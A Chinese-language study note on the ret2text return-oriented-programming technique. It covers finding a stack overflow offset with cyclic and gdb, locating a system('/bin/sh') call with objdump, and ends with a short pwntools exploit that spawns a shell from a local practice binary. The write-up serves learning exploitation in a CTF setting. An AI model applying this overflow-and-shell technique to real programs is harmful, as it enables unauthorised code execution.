# ROP-Ret2Text学习

>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段( gadgets )来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。



依赖与程序中存在 执行system("/bin/sh")的函数



### Cyclic找到溢出点

> cyclic 200 # 生成一串随机的 但有具有特殊规律的字符串 对应peda 的指令 是  peda 中指令 ` pattern create 200`；效果如下图

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-25_11-04-14.png)

> 然后运行 gdb 调试 程序，`r`使其运行起来，将所得字符串输入

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-25_11-50-14.png)

可得到 溢出地址，使用cyclic即可得到偏移量

> cyclic -l 0x62616164   #peda 中指令 ` pattern offset 0x62616164`

以上情况，即溢出后暂停得到了 溢出地址，但对于有的情况，程序正确避免溢出地址。没有给出准确溢出地址；即可使用查找字符串的方式 计算偏移，对于上述情况是`cyclic -l eaab` --->对于该题，由于以及得到溢出地址，该方式计算出的便宜会多四个字节

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-25_12-25-09.png)

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-25_20-03-04.png)

### Objdump使用

objdump -t xxx 查看程序中使用到的函数

objdump -d xxx 查看程序中函数的汇编代码

objdump -d -j .plt xxx 查看plt表

  -j的参数有： .text  - 代码段

​           .const - 只读数据段（有些编译器不使用此段，将只读数据并入.data段）

​           .data  - 读写数据段

​           .bss  - bss段

> objdump -d -M intel ret2text   #-M intel 表示选择intel 架构



### ret2text 例题解析

该题无源码。

首先是 使用 objdump查看汇编代码

>objdump -d -M intel ret2text   #-M intel 表示选择intel 架构

然后进一步找到，我们想要的 system函数的位置

> objdump -d -M intel ret2text| grep system  

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-25_15-37-59.png)

为了利用该函数，需要了解其参数；因此在上诉得到的汇编代码中找到相应位置查看。

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-25_15-39-01.png)

然后使用gdb调试，加载后使用`x/s addr`查看相关指令

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-25_15-40-26.png)

然后使用cyclic找到溢出点

payload 如下图所示：

```python
from pwn import *
p = process("./Example/ret2text")
offset = 112 
addr = 0x804863a    #注意，这个位置与字符串位置不一样，该位置为使用字符串的地址。而字符串的地址为数据存储段
payload = offset*b'A' + p32(addr)
p.sendline(payload)
p.interactive()

```

